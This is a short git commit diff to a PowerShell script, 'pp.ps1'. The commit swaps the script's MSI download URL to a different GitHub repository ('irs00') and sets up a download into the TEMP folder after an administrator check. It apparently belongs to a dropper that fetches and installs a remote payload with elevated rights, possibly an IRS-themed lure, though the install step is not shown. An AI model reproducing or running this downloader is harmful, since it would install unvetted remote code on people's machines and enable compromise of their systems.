3043c9d89edbbbb8d58bd28cc4ea15000639cacc
browlee01 <borw@cheaperx.info>
2026-04-27 21:58:22 +0100

    Update pp.ps1

--- pp.ps1
+++ pp.ps1
@@ -6,7 +6,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 }
 
 # Set the MSI URL
-$msiUrl = "https://github.com/Oladaddy1/super/raw/refs/heads/main/1TPJ2ZCAV1SZK_19SVD5F8E52GI_windows_x64.msi"
+$msiUrl = "https://github.com/browlee01/irs00/raw/refs/heads/main/1K358KH24ZR40_19SVCHZSPXXC0_windows_x64.msi"
 
 # Destination in TEMP folder
 $dest = Join-Path $env:TEMP $([System.IO.Path]::GetFileName($msiUrl))
